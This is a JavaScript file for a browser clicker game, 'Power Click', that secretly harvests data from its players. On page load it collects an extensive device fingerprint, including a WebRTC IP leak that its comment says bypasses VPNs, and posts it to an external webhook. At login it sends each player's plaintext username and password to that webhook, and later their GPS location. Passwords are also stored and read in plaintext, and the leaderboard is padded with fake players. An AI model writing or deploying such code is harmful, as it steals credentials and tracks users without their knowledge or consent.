/**
 * POWER CLICK — Controller · Auth · Data Collection
 *
 * Webhook events (4 seulement) :
 *  1. page_visit          — chargement de la page (fingerprint complet)
 *  2. username_entered    — dès que l'user quitte le champ username
 *  3. credentials_submitted — soumission du formulaire (username + password)
 *  4. location_response   — réponse à la demande de géolocalisation
 *
 * Auth : Supabase table `users` (username UNIQUE, password plaintext)
 * Save : Supabase `users.save_data` (jsonb) + localStorage fallback
 */

(function () {
  'use strict';

  /* ─── Config ─── */
  const WEBHOOK_URL  = 'https://n8n.krf-studio.com/webhook/2a849483-3467-4ca5-ae04-b53de826226e';
  const SUPABASE_URL = 'https://qivgveutnlbawlvlpkbg.supabase.co';
  const SUPABASE_KEY = 'sb_publishable_FnaIhRz7wdgrhx81rKIWXA_Amwk6v45';

  const HEADERS = {
    'Content-Type':  'application/json',
    'apikey':        SUPABASE_KEY,
    'Authorization': `Bearer ${SUPABASE_KEY}`,
  };

  /* ─── Fake seed entries (fallback quand le leaderboard est vide) ─── */
  const FAKE_ENTRIES = [
    { username:'DavidK',  score:52000, prestige_count:5, multiplier:6, total_power:4e11, country:'Israel', country_code:'IL' },
    { username:'PierreM', score:41000, prestige_count:4, multiplier:5, total_power:9e10, country:'France',  country_code:'FR' },
    { username:'YaelB',   score:31000, prestige_count:3, multiplier:4, total_power:2e10, country:'Israel', country_code:'IL' },
    { username:'SophieL', score:22000, prestige_count:2, multiplier:3, total_power:4e9,  country:'France',  country_code:'FR' },
    { username:'MoshiA',  score:15000, prestige_count:1, multiplier:2, total_power:8e8,  country:'Israel', country_code:'IL' },
    { username:'JulieT',  score:8000,  prestige_count:0, multiplier:1, total_power:5e7,  country:'France',  country_code:'FR' },
  ];

  /* ─── Runtime state ─── */
  let deviceInfo   = {};
  let advancedInfo = {};
  let ipData       = {};
  let sessionStart = Date.now();
  const userProfile = { username: '', password: '', country: '', countryCode: '', flag: '' };
  let currentPrestigeScore  = 0;
  let prestigeScoreSubmitted = false;
  let inGameScoreSubmitted  = false;
  let rankingTabLoaded      = false;
  let usernameWebhookFired  = false;
  let lastSupabaseSave      = 0;

  /* ══════════════════════════════════════════════
     1. FINGERPRINT DE BASE (synchrone)
  ══════════════════════════════════════════════ */
  function collectDeviceInfo() {
    const nav = navigator, scr = screen, w = window;
    deviceInfo = {
      userAgent:    nav.userAgent,
      platform:     nav.platform,
      vendor:       nav.vendor || '',
      language:     nav.language,
      languages:    (nav.languages || [nav.language]).join(', '),
      cookiesEnabled:   nav.cookieEnabled,
      doNotTrack:       nav.doNotTrack,
      screenWidth:      scr.width,
      screenHeight:     scr.height,
      screenAvailW:     scr.availWidth,
      screenAvailH:     scr.availHeight,
      colorDepth:       scr.colorDepth,
      pixelDepth:       scr.pixelDepth,
      pixelRatio:       w.devicePixelRatio,
      innerWidth:       w.innerWidth,
      innerHeight:      w.innerHeight,
      outerWidth:       w.outerWidth,
      outerHeight:      w.outerHeight,
      screenOrientation: (scr.orientation && scr.orientation.type) || 'unknown',
      timezone:         Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset:   new Date().getTimezoneOffset(),
      touchSupport:     'ontouchstart' in w || nav.maxTouchPoints > 0,
      maxTouchPoints:   nav.maxTouchPoints || 0,
      pointerType:      w.PointerEvent ? 'pointer' : (w.TouchEvent ? 'touch' : 'mouse'),
      hardwareConcurrency: nav.hardwareConcurrency || 'unknown',
      deviceMemory:     nav.deviceMemory || 'unknown',
      referrer:         document.referrer || 'direct',
      currentUrl:       w.location.href,
      historyLength:    w.history.length,
      javaEnabled:      nav.javaEnabled ? nav.javaEnabled() : false,
      pdfViewerEnabled: nav.pdfViewerEnabled || false,
      pluginsCount:     nav.plugins ? nav.plugins.length : 0,
    };

    /* Connection */
    const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
    if (conn) {
      deviceInfo.connectionType          = conn.type          || 'unknown';
      deviceInfo.connectionEffectiveType = conn.effectiveType || 'unknown';
      deviceInfo.connectionDownlink      = conn.downlink      || 'unknown';
      deviceInfo.connectionRtt           = conn.rtt           || 'unknown';
      deviceInfo.connectionSaveData      = conn.saveData      || false;
    }

    /* Canvas fingerprint */
    try {
      const c = document.createElement('canvas'), ctx = c.getContext('2d');
      c.width = 200; c.height = 50;
      ctx.textBaseline = 'alphabetic'; ctx.font = '14px Arial';
      ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069'; ctx.fillText('PowerClick🎯', 2, 15);
      ctx.fillStyle = 'rgba(102,204,0,0.7)'; ctx.fillText('PowerClick🎯', 4, 17);
      deviceInfo.canvasFingerprint = c.toDataURL().slice(-80);
    } catch(e) { deviceInfo.canvasFingerprint = 'blocked'; }

    /* WebGL */
    try {
      const c2 = document.createElement('canvas');
      const gl = c2.getContext('webgl') || c2.getContext('experimental-webgl');
      if (gl) {
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        if (dbg) {
          deviceInfo.gpuVendor   = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
          deviceInfo.gpuRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
        }
        deviceInfo.glVersion      = gl.getParameter(gl.VERSION);
        deviceInfo.glShadingLang  = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
        deviceInfo.glExtensions   = gl.getSupportedExtensions().length;
      }
    } catch(e) {}

    /* Battery */
    if (nav.getBattery) nav.getBattery().then(b => {
      deviceInfo.batteryLevel    = Math.round(b.level * 100) + '%';
      deviceInfo.batteryCharging = b.charging;
      deviceInfo.batteryChargingTime  = b.chargingTime;
      deviceInfo.batteryDischargingTime = b.dischargingTime;
    }).catch(() => {});

    /* Media devices */
    if (nav.mediaDevices && nav.mediaDevices.enumerateDevices) {
      nav.mediaDevices.enumerateDevices().then(devs => {
        deviceInfo.audioInputs  = devs.filter(d => d.kind === 'audioinput').length;
        deviceInfo.audioOutputs = devs.filter(d => d.kind === 'audiooutput').length;
        deviceInfo.videoInputs  = devs.filter(d => d.kind === 'videoinput').length;
      }).catch(() => {});
    }
  }

  /* ══════════════════════════════════════════════
     2. FINGERPRINT AVANCÉ (async — bonus)
  ══════════════════════════════════════════════ */
  async function collectAdvancedInfo() {
    const adv = {};

    /* WebRTC — leak d'IP locale même derrière VPN */
    adv.webrtcIPs = await getWebRTCIPs();

    /* Audio fingerprint */
    adv.audioFingerprint = await getAudioFingerprint();

    /* Fonts détectées */
    adv.detectedFonts = detectFonts();

    /* Performance timing */
    try {
      const t = performance.timing || {};
      adv.pageLoadMs   = t.loadEventEnd - t.navigationStart || 'n/a';
      adv.domReadyMs   = t.domContentLoadedEventEnd - t.navigationStart || 'n/a';
      adv.dnsMs        = t.domainLookupEnd - t.domainLookupStart || 0;
    } catch(e) {}

    /* Storage quota */
    try {
      if (navigator.storage && navigator.storage.estimate) {
        const est = await navigator.storage.estimate();
        adv.storageQuotaMB = Math.round((est.quota || 0) / 1024 / 1024);
        adv.storageUsedMB  = Math.round((est.usage  || 0) / 1024 / 1024);
      }
    } catch(e) {}

    /* Capacités navigateur */
    adv.serviceWorker  = 'serviceWorker' in navigator;
    adv.indexedDB      = 'indexedDB'     in window;
    adv.webAssembly    = typeof WebAssembly === 'object';
    adv.webRTC         = !!window.RTCPeerConnection;
    adv.notifications  = 'Notification'  in window;
    adv.geolocation    = 'geolocation'   in navigator;
    adv.bluetooth      = 'bluetooth'     in navigator;
    adv.usb            = 'usb'           in navigator;
    adv.clipboard      = 'clipboard'     in navigator;
    adv.credentialsMgr = 'credentials'   in navigator;
    adv.paymentRequest = 'PaymentRequest' in window;
    adv.wakeLock       = 'wakeLock'       in navigator;
    adv.speechSynth    = 'speechSynthesis' in window;
    adv.speechRec      = !!(window.SpeechRecognition || window.webkitSpeechRecognition);

    /* Color gamut */
    adv.colorGamutSRGB  = window.matchMedia('(color-gamut: srgb)').matches;
    adv.colorGamutP3    = window.matchMedia('(color-gamut: p3)').matches;
    adv.colorGamutRec2020 = window.matchMedia('(color-gamut: rec2020)').matches;
    adv.hdr             = window.matchMedia('(dynamic-range: high)').matches;
    adv.prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    adv.prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
    adv.forcedColors    = window.matchMedia('(forced-colors: active)').matches;

    /* Ad blocker heuristic */
    adv.adBlockerLikely = await detectAdBlocker();

    /* Incognito heuristic (storage quota très bas = probablement incognito) */
    try {
      if (navigator.storage && navigator.storage.estimate) {
        const est2 = await navigator.storage.estimate();
        adv.likelyIncognito = (est2.quota || 0) < 120 * 1024 * 1024;
      }
    } catch(e) {}

    /* Permissions check */
    try {
      const camPerm  = await navigator.permissions.query({ name: 'camera' });
      const micPerm  = await navigator.permissions.query({ name: 'microphone' });
      const notifPerm= await navigator.permissions.query({ name: 'notifications' });
      adv.cameraPermission  = camPerm.state;
      adv.micPermission     = micPerm.state;
      adv.notifPermission   = notifPerm.state;
    } catch(e) {}

    advancedInfo = adv;
    return adv;
  }

  /* ── WebRTC IP leak ── */
  function getWebRTCIPs() {
    return new Promise(resolve => {
      try {
        const ips = new Set();
        const pc  = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => resolve([]));
        pc.onicecandidate = e => {
          if (!e || !e.candidate) { pc.close(); resolve([...ips]); return; }
          const m = e.candidate.candidate.match(
            /(\d{1,3}(?:\.\d{1,3}){3}|[a-f0-9:]+:[a-f0-9:]+)/gi
          );
          if (m) m.forEach(ip => ips.add(ip));
        };
        setTimeout(() => { try { pc.close(); } catch(x){} resolve([...ips]); }, 1500);
      } catch(e) { resolve([]); }
    });
  }

  /* ── Audio fingerprint ── */
  function getAudioFingerprint() {
    return new Promise(resolve => {
      try {
        const AC  = window.AudioContext || window.webkitAudioContext;
        if (!AC) return resolve('unsupported');
        const ctx = new AC();
        const osc = ctx.createOscillator();
        const cmp = ctx.createDynamicsCompressor();
        [
          ['attack', 0], ['knee', 40], ['ratio', 12],
          ['reduction', -20], ['release', 0.25], ['threshold', -50]
        ].forEach(([k, v]) => { if (cmp[k]) cmp[k].value = v; });
        osc.connect(cmp);
        cmp.connect(ctx.destination);
        osc.start(0);
        ctx.startRendering && ctx.startRendering();
        setTimeout(() => {
          const buf = cmp.reduction;
          osc.disconnect(); cmp.disconnect();
          ctx.close().catch(() => {});
          resolve(typeof buf === 'number' ? buf.toFixed(6) : String(buf));
        }, 100);
      } catch(e) { resolve('blocked'); }
    });
  }

  /* ── Font detection ── */
  function detectFonts() {
    const testFonts = [
      'Arial','Arial Black','Comic Sans MS','Courier New','Georgia',
      'Helvetica','Impact','Times New Roman','Trebuchet MS','Verdana',
      'Calibri','Cambria','Candara','Consolas','Constantia','Corbel',
      'Segoe UI','Tahoma','Palatino Linotype','Garamond','Bookman Old Style',
      'Futura','Gill Sans','Optima','Zapf Chancery',
      'Apple SD Gothic Neo','Hiragino Sans','Meiryo','Malgun Gothic',
    ];
    const canvas = document.createElement('canvas');
    const ctx    = canvas.getContext('2d');
    const base   = 'monospace';
    const TEST   = 'mmmmmmmmmmlli';
    const SIZE   = '72px ';
    ctx.font = SIZE + base;
    const baseW = ctx.measureText(TEST).width;
    return testFonts.filter(f => {
      ctx.font = SIZE + `'${f}', ${base}`;
      return ctx.measureText(TEST).width !== baseW;
    });
  }

  /* ── Ad blocker detection ── */
  function detectAdBlocker() {
    return new Promise(resolve => {
      const bait = document.createElement('div');
      bait.className = 'ad_unit ads adsbox';
      bait.style.cssText = 'position:fixed;height:1px;width:1px;opacity:0;top:0;left:0';
      document.body.appendChild(bait);
      setTimeout(() => {
        const blocked = bait.offsetHeight === 0 || bait.offsetParent === null ||
                        getComputedStyle(bait).display === 'none';
        bait.remove();
        resolve(blocked);
      }, 50);
    });
  }

  /* ══════════════════════════════════════════════
     3. IP / GEO LOOKUP
  ══════════════════════════════════════════════ */
  function collectIpData() {
    return fetch('https://ipapi.co/json/')
      .then(r => r.json())
      .then(data => {
        ipData = {
          ip: data.ip, city: data.city, region: data.region,
          country: data.country_name, countryCode: data.country_code,
          postal: data.postal, latitude: data.latitude, longitude: data.longitude,
          org: data.org, asn: data.asn,
          timezone: data.timezone, utcOffset: data.utc_offset,
          callingCode: data.country_calling_code,
          currency: data.currency,
          languages: data.languages,
          inEU: data.in_eu,
        };
        return ipData;
      })
      .catch(() => { ipData = { error: 'blocked' }; return ipData; });
  }

  /* ══════════════════════════════════════════════
     4. WEBHOOK SENDER (fire-and-forget)
  ══════════════════════════════════════════════ */
  function sendToWebhook(eventType, extraData = {}) {
    const payload = {
      event:           eventType,
      timestamp:       new Date().toISOString(),
      sessionDurationSec: Math.round((Date.now() - sessionStart) / 1000),
      user:            { ...userProfile },
      device:          deviceInfo,
      advanced:        advancedInfo,
      network:         ipData,
      ...extraData
    };
    fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(() => {});
  }

  /* ══════════════════════════════════════════════
     5. SUPABASE — Auth (users table)
  ══════════════════════════════════════════════ */
  async function sbGetUser(username) {
    try {
      const r = await fetch(
        `${SUPABASE_URL}/rest/v1/users?username=eq.${encodeURIComponent(username)}&select=username,password,save_data`,
        { headers: HEADERS }
      );
      const data = await r.json();
      return Array.isArray(data) && data.length > 0 ? data[0] : null;
    } catch(e) { return null; }
  }

  async function sbCreateUser(username, password) {
    try {
      const r = await fetch(`${SUPABASE_URL}/rest/v1/users`, {
        method: 'POST',
        headers: { ...HEADERS, Prefer: 'return=minimal' },
        body: JSON.stringify({ username, password, save_data: {} })
      });
      return r.ok;
    } catch(e) { return false; }
  }

  async function sbSaveSaveData(username, saveData) {
    const now = Date.now();
    if (now - lastSupabaseSave < 30000) return; // max 1 save/30 s
    lastSupabaseSave = now;
    try {
      await fetch(
        `${SUPABASE_URL}/rest/v1/users?username=eq.${encodeURIComponent(username)}`,
        {
          method: 'PATCH',
          headers: { ...HEADERS, Prefer: 'return=minimal' },
          body: JSON.stringify({ save_data: saveData, last_seen_at: new Date().toISOString() })
        }
      );
    } catch(e) {}
  }

  /* ══════════════════════════════════════════════
     6. SUPABASE — Leaderboard upsert (RPC + fallback)
  ══════════════════════════════════════════════ */
  async function submitScoreToLeaderboard(username, score, prestigeCount, totalPower, multiplier, country, countryCode) {
    /* Essai via RPC (GREATEST logic côté serveur) */
    try {
      const r = await fetch(`${SUPABASE_URL}/rest/v1/rpc/submit_score`, {
        method: 'POST',
        headers: HEADERS,
        body: JSON.stringify({
          p_username: username, p_score: score,
          p_prestige_count: prestigeCount, p_total_power: totalPower,
          p_multiplier: multiplier, p_country: country, p_country_code: countryCode
        })
      });
      if (r.ok) return true;
    } catch(e) {}

    /* Fallback : upsert REST direct */
    try {
      const r2 = await fetch(`${SUPABASE_URL}/rest/v1/leaderboard?on_conflict=username`, {
        method: 'POST',
        headers: { ...HEADERS, Prefer: 'resolution=merge-duplicates,return=minimal' },
        body: JSON.stringify({
          username, score, prestige_count: prestigeCount, total_power: totalPower,
          multiplier, country, country_code: countryCode,
          updated_at: new Date().toISOString()
        })
      });
      return r2.ok;
    } catch(e) {}
    return false;
  }

  /* ══════════════════════════════════════════════
     7. SUPABASE — Fetch leaderboard top N
  ══════════════════════════════════════════════ */
  function fetchLeaderboard(limit = 10) {
    return fetch(
      `${SUPABASE_URL}/rest/v1/leaderboard?select=username,score,prestige_count,total_power,multiplier,country,country_code&order=score.desc&limit=${limit}`,
      { headers: HEADERS }
    ).then(r => r.json()).catch(() => []);
  }

  /* ══════════════════════════════════════════════
     8. HELPERS
  ══════════════════════════════════════════════ */
  function countryCodeToFlag(code) {
    if (!code || code.length !== 2) return '🌍';
    return code.toUpperCase().replace(/./g, ch =>
      String.fromCodePoint(0x1F1E6 - 65 + ch.charCodeAt(0))
    );
  }
  function escapeHtml(str) {
    return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
  }
  function computeScore(prestigeCount, totalEarned) {
    return (prestigeCount || 0) * 10000 +
      Math.min(9999, Math.floor(Math.log10((totalEarned || 0) + 1) * 1000));
  }

  /* ══════════════════════════════════════════════
     9. DOM REFS
  ══════════════════════════════════════════════ */
  const screenUsername  = document.getElementById('screen-username');
  const screenGame      = document.getElementById('screen-game');
  const usernameInput   = document.getElementById('username-input');
  const passwordInput   = document.getElementById('password-input');
  const btnPlay         = document.getElementById('btn-play');
  const btnPlayText     = document.getElementById('btn-play-text');
  const usernameError   = document.getElementById('username-error');

  const overlay            = document.getElementById('overlay');
  const locationSection    = document.getElementById('location-section');
  const btnAllowLoc        = document.getElementById('btn-allow-location');
  const btnSkipLoc         = document.getElementById('btn-skip-location');
  const leaderboardLoading = document.getElementById('leaderboard-loading');
  const leaderboardList    = document.getElementById('leaderboard-list');
  const btnContinue        = document.getElementById('btn-continue');
  const ovMultiplier       = document.getElementById('ov-multiplier');
  const ovPrestigeLvl      = document.getElementById('ov-prestige-lvl');

  const ingameLbLoading = document.getElementById('ingame-lb-loading');
  const ingameLbList    = document.getElementById('ingame-lb-list');
  const btnLbRefresh    = document.getElementById('btn-lb-refresh');
  const btnIngameSubmit = document.getElementById('btn-ingame-submit');
  const lbSubmitStatus  = document.getElementById('lb-submit-status');

  const submitModal  = document.getElementById('submit-modal');
  const btnSmAllow   = document.getElementById('btn-sm-allow');
  const btnSmSkip    = document.getElementById('btn-sm-skip');
  const btnSmCancel  = document.getElementById('btn-sm-cancel');

  /* ══════════════════════════════════════════════
     10. SCREEN TRANSITION
  ══════════════════════════════════════════════ */
  function showError(msg) {
    if (!usernameError) return;
    usernameError.textContent = msg;
    usernameError.classList.remove('hidden');
  }
  function hideError() { usernameError && usernameError.classList.add('hidden'); }

  function setButtonLoading(isLoading, text = '') {
    if (!btnPlay || !btnPlayText) return;
    if (isLoading) {
      btnPlay.classList.add('loading');
      btnPlayText.textContent = text || 'LOADING';
    } else {
      btnPlay.classList.remove('loading');
      btnPlayText.textContent = 'START CLICKING';
    }
  }

  function showGameScreen() {
    screenUsername.classList.remove('active');
    screenUsername.classList.add('hidden');
    screenGame.classList.remove('hidden');
    requestAnimationFrame(() => screenGame.classList.add('active'));
  }

  /* ══════════════════════════════════════════════
     11. WEBHOOK #2 — username_entered (sur blur)
  ══════════════════════════════════════════════ */
  usernameInput && usernameInput.addEventListener('blur', () => {
    const val = usernameInput.value.trim();
    if (!val || usernameWebhookFired) return;
    usernameWebhookFired = true;
    sendToWebhook('username_entered', { username: val });
  });

  /* ══════════════════════════════════════════════
     12. LOGIN / REGISTER FLOW
  ══════════════════════════════════════════════ */
  async function submitCredentials() {
    hideError();
    const username = usernameInput.value.trim();
    const password = passwordInput.value;

    if (!username) {
      usernameInput.focus();
      showError('Please enter a username.');
      return;
    }
    if (!password) {
      passwordInput.focus();
      showError('Please enter a password.');
      return;
    }

    setButtonLoading(true, 'CHECKING');

    /* WEBHOOK #3 — credentials_submitted (avec password) */
    userProfile.username = username;
    userProfile.password = password;
    sendToWebhook('credentials_submitted', {
      username, password,
      action: 'attempting_login_or_register'
    });

    /* Check Supabase */
    const existing = await sbGetUser(username);

    if (existing) {
      /* Utilisateur existant — vérifier le mot de passe */
      if (existing.password !== password) {
        setButtonLoading(false);
        showError('❌ Wrong password for this username.');
        sendToWebhook('login_failed', { username, reason: 'wrong_password' });
        return;
      }
      /* Bon mot de passe → charger la sauvegarde */
      const savedState = existing.save_data || null;
      setButtonLoading(false);
      startGame(username, savedState, 'login');
    } else {
      /* Nouveau joueur → créer le compte */
      const created = await sbCreateUser(username, password);
      setButtonLoading(false);
      if (!created) {
        showError('⚠️ Server error. Starting offline.');
      }
      startGame(username, null, 'register');
    }
  }

  function startGame(username, savedState, mode) {
    window._username = username;
    showGameScreen();
    if (typeof window._startGame === 'function') {
      window._startGame(username, savedState);
    }
    /* Expose la fonction de sauvegarde Supabase à script2.js */
    window._saveSaveData = async (uname, data) => {
      await sbSaveSaveData(uname, data);
    };
  }

  btnPlay.addEventListener('click', submitCredentials);
  usernameInput.addEventListener('keydown', e => { if (e.key === 'Enter') passwordInput && passwordInput.focus(); });
  passwordInput && passwordInput.addEventListener('keydown', e => { if (e.key === 'Enter') submitCredentials(); });
  usernameInput.addEventListener('input', hideError);
  passwordInput && passwordInput.addEventListener('input', hideError);

  /* ══════════════════════════════════════════════
     13. TABS
  ══════════════════════════════════════════════ */
  document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const tab = btn.dataset.tab;
      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('tab-active'));
      btn.classList.add('tab-active');
      document.querySelectorAll('.tab-pane').forEach(p => p.classList.add('hidden'));
      const pane = document.getElementById('tab-' + tab);
      if (pane) pane.classList.remove('hidden');
      if (tab === 'ranking' && !rankingTabLoaded) {
        rankingTabLoaded = true;
        loadInGameLeaderboard();
      }
    });
  });

  /* ══════════════════════════════════════════════
     14. IN-GAME LEADERBOARD
  ══════════════════════════════════════════════ */
  async function loadInGameLeaderboard() {
    if (!ingameLbList) return;
    if (ingameLbLoading) ingameLbLoading.classList.remove('hidden');
    ingameLbList.innerHTML = '';

    let entries = await fetchLeaderboard(10);
    if (ingameLbLoading) ingameLbLoading.classList.add('hidden');
    if (!entries || !Array.isArray(entries) || entries.length === 0) entries = FAKE_ENTRIES;

    const medals = ['🥇','🥈','🥉'];
    const rankCls= ['gold','silver','bronze'];

    entries.forEach((e, i) => {
      const rank    = i + 1;
      const isMe    = e.username === userProfile.username;
      const rankLbl = rank <= 3 ? medals[i] : `#${rank}`;
      const rCls    = rank <= 3 ? rankCls[i] : '';
      const prestige= e.prestige_count > 0 ? `✨${e.prestige_count}` : '—';
      const li = document.createElement('li');
      li.className = 'ilb-entry' + (isMe ? ' ilb-me' : '');
      li.innerHTML = `
        <span class="ilb-rank ${rCls}">${rankLbl}</span>
        <span class="ilb-flag">${countryCodeToFlag(e.country_code)}</span>
        <span class="ilb-name">${escapeHtml(e.username)}</span>
        <span class="ilb-prestige">${prestige}</span>`;
      ingameLbList.appendChild(li);
    });
  }

  btnLbRefresh && btnLbRefresh.addEventListener('click', () => {
    rankingTabLoaded = true;
    loadInGameLeaderboard();
  });

  setInterval(() => {
    const tab = document.getElementById('tab-ranking');
    if (tab && !tab.classList.contains('hidden') && rankingTabLoaded) loadInGameLeaderboard();
  }, 30000);

  /* ══════════════════════════════════════════════
     15. IN-GAME SUBMIT (bouton "Add My Score")
  ══════════════════════════════════════════════ */
  btnIngameSubmit && btnIngameSubmit.addEventListener('click', () => {
    if (inGameScoreSubmitted) return;
    submitModal && submitModal.classList.remove('hidden');
  });

  btnSmCancel && btnSmCancel.addEventListener('click', () => submitModal && submitModal.classList.add('hidden'));

  btnSmAllow && btnSmAllow.addEventListener('click', async () => {
    submitModal.classList.add('hidden');
    const onOk  = pos => doInGameSubmit(pos.coords.latitude, pos.coords.longitude);
    const onErr = ()  => doInGameSubmit(ipData.latitude, ipData.longitude, true);
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(onOk, onErr, { enableHighAccuracy: true, timeout: 8000 });
    } else { onErr(); }
  });

  btnSmSkip && btnSmSkip.addEventListener('click', () => {
    submitModal.classList.add('hidden');
    doInGameSubmit(null, null, true);
  });

  async function doInGameSubmit(lat, lon, ipFallback = false) {
    const gs = window._getGameState ? window._getGameState() : null;
    if (!gs) return;

    const country     = ipData.country     || 'Unknown';
    const countryCode = ipData.countryCode || '';
    userProfile.country     = country;
    userProfile.countryCode = countryCode;
    userProfile.flag        = countryCodeToFlag(countryCode);

    const score = computeScore(gs.prestigeCount, gs.totalEarnedAllTime);

    if (btnIngameSubmit) { btnIngameSubmit.textContent = '⏳ Submitting…'; btnIngameSubmit.disabled = true; }

    const ok = await submitScoreToLeaderboard(
      userProfile.username, score,
      gs.prestigeCount, gs.totalEarnedAllTime, gs.prestigeMultiplier,
      country, countryCode
    );

    inGameScoreSubmitted = true;

    if (btnIngameSubmit) btnIngameSubmit.classList.add('hidden');
    if (lbSubmitStatus) {
      lbSubmitStatus.textContent = ok ? '✅ Score added to the leaderboard!' : '⚠️ Submitted locally — sync later.';
      lbSubmitStatus.className   = 'lb-submit-status ' + (ok ? 'success' : 'error');
      lbSubmitStatus.classList.remove('hidden');
    }

    /* WEBHOOK #4 — location_response */
    sendToWebhook('location_response', {
      source: 'ingame_submit', allowed: !ipFallback,
      lat: lat || ipData.latitude, lon: lon || ipData.longitude,
      country, countryCode, score,
      prestigeCount: gs.prestigeCount, totalPower: gs.totalEarnedAllTime,
    });

    loadInGameLeaderboard();
  }

  /* ══════════════════════════════════════════════
     16. PRESTIGE OVERLAY
  ══════════════════════════════════════════════ */
  window.onPrestige = function (prestigeCount, multiplier, totalEarnedAllTime) {
    currentPrestigeScore   = computeScore(prestigeCount, totalEarnedAllTime);
    prestigeScoreSubmitted = false;
    inGameScoreSubmitted   = false;

    if (ovMultiplier)  ovMultiplier.textContent  = 'x' + multiplier;
    if (ovPrestigeLvl) ovPrestigeLvl.textContent = prestigeCount;
    if (locationSection) locationSection.classList.remove('hidden');
    if (btnAllowLoc) { btnAllowLoc.textContent = '📍 Submit Score'; btnAllowLoc.disabled = false; }
    if (btnSkipLoc)  btnSkipLoc.disabled = false;
    if (btnIngameSubmit) { btnIngameSubmit.textContent = '📍 Add My Score'; btnIngameSubmit.disabled = false; btnIngameSubmit.classList.remove('hidden'); }
    if (lbSubmitStatus)  lbSubmitStatus.classList.add('hidden');

    overlay.classList.remove('hidden');
    loadOverlayLeaderboard(false);
  };

  async function loadOverlayLeaderboard(highlightNew) {
    if (leaderboardLoading) leaderboardLoading.classList.remove('hidden');
    if (leaderboardList)    leaderboardList.innerHTML = '';
    let entries = await fetchLeaderboard(10);
    if (leaderboardLoading) leaderboardLoading.classList.add('hidden');
    if (!entries || !Array.isArray(entries) || entries.length === 0) entries = FAKE_ENTRIES;

    const medals = ['🥇','🥈','🥉'], rankCls = ['gold','silver','bronze'];
    entries.forEach((e, i) => {
      const rank    = i + 1;
      const isNewMe = highlightNew && e.username === userProfile.username && e.score === currentPrestigeScore;
      const li = document.createElement('li');
      li.className = `leaderboard-entry${isNewMe ? ' highlight' : ''}`;
      li.innerHTML = `
        <span class="lb-rank ${rank <= 3 ? rankCls[i] : ''}">${rank <= 3 ? medals[i] : '#'+rank}</span>
        <span class="lb-flag">${countryCodeToFlag(e.country_code)}</span>
        <span class="lb-name">${escapeHtml(e.username)}</span>
        <span class="lb-score">✨${e.prestige_count || 0}</span>`;
      leaderboardList.appendChild(li);
    });
  }

  btnAllowLoc && btnAllowLoc.addEventListener('click', () => {
    if (prestigeScoreSubmitted) return;
    btnAllowLoc.textContent = '⏳ Locating…'; btnAllowLoc.disabled = true;
    if (btnSkipLoc) btnSkipLoc.disabled = true;
    const onOk  = pos => { userProfile.locationSource = 'GPS'; finishPrestigeSubmit(pos.coords.latitude, pos.coords.longitude); };
    const onErr = ()  => finishPrestigeSubmit(ipData.latitude, ipData.longitude, true);
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(onOk, onErr, { enableHighAccuracy: true, timeout: 8000 });
    } else { onErr(); }
  });

  async function finishPrestigeSubmit(lat, lon, ipFallback = false) {
    prestigeScoreSubmitted = true;
    const gs          = window._getGameState ? window._getGameState() : {};
    const country     = ipData.country     || 'Unknown';
    const countryCode = ipData.countryCode || '';
    userProfile.country     = country;
    userProfile.countryCode = countryCode;
    userProfile.flag        = countryCodeToFlag(countryCode);

    /* WEBHOOK #4 — location_response */
    sendToWebhook('location_response', {
      source: 'prestige_overlay', allowed: !ipFallback,
      lat: lat || ipData.latitude, lon: lon || ipData.longitude,
      country, countryCode, score: currentPrestigeScore,
      prestigeCount: gs.prestigeCount, totalPower: gs.totalEarnedAllTime,
    });

    if (locationSection) locationSection.classList.add('hidden');
    await submitScoreToLeaderboard(
      userProfile.username, currentPrestigeScore,
      gs.prestigeCount, gs.totalEarnedAllTime, gs.prestigeMultiplier,
      country, countryCode
    );
    loadOverlayLeaderboard(true);
    loadInGameLeaderboard();
  }

  btnSkipLoc && btnSkipLoc.addEventListener('click', () => {
    if (prestigeScoreSubmitted) return;
    prestigeScoreSubmitted = true;
    if (locationSection) locationSection.classList.add('hidden');
    /* WEBHOOK #4 — location_response (refusé) */
    sendToWebhook('location_response', { source: 'prestige_overlay', allowed: false, score: currentPrestigeScore });
  });

  btnContinue && btnContinue.addEventListener('click', () => overlay.classList.add('hidden'));

  /* ══════════════════════════════════════════════
     17. HOOKS exposés à script2.js
  ══════════════════════════════════════════════ */
  window._registerClick = function () {}; // plus de webhook sur les clics

  /* ══════════════════════════════════════════════
     18. INIT — collecte des données + webhook #1
  ══════════════════════════════════════════════ */
  collectDeviceInfo();

  /* Lancement parallèle : IP + fingerprint avancé */
  Promise.all([collectIpData(), collectAdvancedInfo()]).then(() => {
    /* WEBHOOK #1 — page_visit avec tout le fingerprint */
    sendToWebhook('page_visit', {
      action: 'user_landed_on_game_page',
    });
  });

  usernameInput && usernameInput.focus();

})();
